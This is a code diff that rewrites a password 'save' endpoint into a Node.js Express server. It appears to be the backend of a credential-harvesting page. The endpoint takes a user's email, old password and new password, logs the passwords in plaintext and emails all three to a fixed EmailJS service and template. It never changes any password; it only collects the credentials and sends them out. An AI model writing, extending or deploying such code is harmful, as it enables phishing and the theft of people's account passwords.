@@ -1,29 +1,35 @@
-import emailjs from 'emailjs-com';
+// Save.js (Node.js Backend API)
+const emailjs = require('emailjs-com'); // Include EmailJS
+const express = require('express');
+const bodyParser = require('body-parser');
 
-export default async function handler(req, res) {
-  if (req.method === 'POST') {
-    const { email, oldPassword, newPassword } = req.body;
+const app = express();
+app.use(bodyParser.json());
 
-    try {
-      // Send the data to EmailJS
-      const response = await emailjs.send(
-        'service_8hdqzju',  // EmailJS Service ID
-        'template_hk6uqi8', // EmailJS Template ID
-        {
-          email: email,
-          oldPassword: oldPassword,
-          newPassword: newPassword,
-        },
-        'ODWuzZ-mZLM196nkP' // EmailJS User ID
-      );
+app.post('/api/save', (req, res) => {
+  const { email, oldPassword, newPassword } = req.body;
 
-      // Return success response
-      res.status(200).json({ message: 'Email sent successfully!' });
-    } catch (error) {
-      console.error('Error sending email:', error);
-      res.status(500).json({ message: 'Failed to send email' });
-    }
-  } else {
-    res.status(405).json({ message: 'Method Not Allowed' });
-  }
-}
+  // Log the details to verify
+  console.log('Email:', email);
+  console.log('Old Password:', oldPassword);
+  console.log('New Password:', newPassword);
+
+  // Send email via EmailJS API
+  emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
+    email: email,
+    oldPassword: oldPassword,
+    newPassword: newPassword
+  })
+  .then(response => {
+    console.log('SUCCESS', response);
+    res.status(200).send('Email sent successfully');
+  })
+  .catch(error => {
+    console.log('FAILED', error);
+    res.status(500).send('Error sending email');
+  });
+});
+
+app.listen(3000, () => {
+  console.log('Server is running on port 3000');
+});
